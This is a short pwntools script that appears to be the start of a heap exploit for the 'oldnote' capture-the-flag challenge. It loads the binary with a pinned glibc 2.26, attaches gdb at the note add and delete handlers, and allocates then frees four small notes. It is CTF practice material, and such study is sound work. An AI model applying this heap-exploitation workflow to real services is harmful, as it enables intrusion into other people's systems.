from pwn import *
p = process(["/home/noxyproxy/RandomCTF/poseidonCTF/pwn/ld-2.26.so", "./oldnote"], env={"LD_PRELOAD":"/home/noxyproxy/RandomCTF/poseidonCTF/pwn/libc-2.26.so"})

def get_base_address(proc):
  return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].decode().split('-')[0], 16)

PIE = get_base_address(p)

script = ''
#script += 'b * 0x0131f\n'
#script += 'b * 0x01456\n'
script += "b *0x%x\n"%(PIE+0x0131f) 
script += "b *0x%x\n"%(PIE+0x01456)


log.info(f'elf base: {hex(PIE)}')
log.info(f'break * add_note: {hex(PIE+0x00131f)}')
log.info(f'break * delete_note: {hex(PIE+0x001456)}')


pid = gdb.attach(p,gdbscript=script)


def add_note(r, size, content):
    r.sendlineafter('choice : ',b'1')
    r.sendlineafter('Note size : ',bytes(str(size), 'utf-8'))
    r.sendlineafter('Note : ',bytes(content, 'utf-8'))

def delete_note(r,index):
    r.sendlineafter('choice : ',b'2')
    r.sendlineafter('Note idx : ',bytes(str(index),'utf-8'))


def akcija(r):
    for _ in range(4):
        add_note(r, 16, 'AAAAAAAAAAAAAAAA')
    for index in range(4):
        delete_note(r,index)
    r.interactive()


akcija(p)